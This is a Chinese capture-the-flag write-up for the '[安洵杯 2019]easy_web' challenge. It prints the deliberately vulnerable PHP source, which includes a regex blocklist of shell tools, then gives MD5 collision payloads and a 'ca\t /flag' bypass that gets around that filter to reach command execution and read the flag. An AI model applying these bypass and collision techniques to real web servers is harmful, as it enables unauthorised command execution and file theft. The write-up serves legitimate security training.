# 原创
：  [安洵杯 2019]easy_web

# [安洵杯 2019]easy_web

#### [安洵杯 2019]easy_web

## 考点

> 
编码、md5碰撞、RCE绕过


## 思路

> 
打开题目链接，第一眼望过去没有啥有用的东西，但我们注意到url的img参数后的东西`TXpVek5UTTFNbVUzTURabE5qYz0`有点像base64，解码两次后我们得到`3535352e706e67`，十六进制转字符串我们得到`555.png`<br/> 我们进行F12查看，发现题目给了img的base64值，应该就是555.png的base64值了，那我们不妨试试，将index.php转十六进制再进行两次base64编码，当做img后面的参数，看看能不能得到index.php的源码，转换后的index.php为`TmprMlJUWTBOalUzT0RKRk56QTJPRGN3`，得到一串base64值，解码得到


```
&lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '&lt;img src ="./ctf3.jpeg"&gt;';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "&lt;img src='data:image/gif;base64," . $txt . "'&gt;&lt;/img&gt;";
    echo "&lt;br&gt;";
}
echo $cmd;
echo "&lt;br&gt;";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i", $cmd)) {
    echo("forbid ~");
    echo "&lt;br&gt;";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?&gt;
&lt;html&gt;
&lt;style&gt;
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
&lt;/style&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;

```

> 
(preg_match("/flag/i", $file))这个把参数里的flag过滤掉了，我们就没法就去读flag文件了，所以利用下面的echo ‘$cmd’;来进行命令执行，在此之前有一个md5强碰撞<br/> 由于是强制转化为string，我们没法通过数组绕过，故采用`fastcoll_v1.0.0.5.exe`进行MD5强碰撞


```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

```

> 
禁用了很多读取文件常用的命令，比如tac、nl、more、head、tail、cat、echo、vi等被ban了，单引号、@、分号、逗号、$、{、}等构造符号也被禁了<br/> dir没被ban，但是\xA0被ban了，于是用dir%20/看一下根目录都有啥文件，发现flag文件<br/> 1.利用ca\t或者/bin/c\at来绕过，利用反斜杠产生转义字符绕过后仍可执行<br/> 2.sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出


## Payload

```
先传参img=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3，得到index.php的源码
利用强碰撞绕过MD5，传参
a=abc%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D6%16y%AC%CE%C5%A1LrY5fn%94%10%D9%01%C3%AC%F8%AAN%21%D0%27%BE%3Ej%A7%22%0C%D08%D3%AF%DFRo%2F%A4%8B%E8%EB45j%E4h%9C%21%22%AB%7E%BC%8E%7C%17%9E%C3Xg%D7%A8%CDHt%BE%AB.%2FWb%3Eb%EA%FC%261%0F_%3D%AFo%3F%1E%DE%E8i%86%7D%BF%C7_Q%CDA%B4%CF%B8n%06Ir%7F%5C%A3k%F9%2AO%DFF%2A%F3%8BcH%FF%85%3F%0D%D0%9B%C7%C8-%12%92
b=abc%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D6%16y%AC%CE%C5%A1LrY5fn%94%10%D9%01%C3%ACx%AAN%21%D0%27%BE%3Ej%A7%22%0C%D08%D3%AF%DFRo%2F%A4%8B%E8%EB45%EA%E4h%9C%21%22%AB%7E%BC%8E%7C%17%9E%C3%D8g%D7%A8%CDHt%BE%AB.%2FWb%3Eb%EA%FC%261%0F_%3D%AFo%BF%1E%DE%E8i%86%7D%BF%C7_Q%CDA%B4%CF%B8n%06Ir%7F%5C%A3k%F9%2A%CF%DEF%2A%F3%8BcH%FF%85%3F%0D%D0%9BG%C8-%12%92
利用ca\t /flag绕过正则，得到flag

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210514140031472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210514140041492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210514140049693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
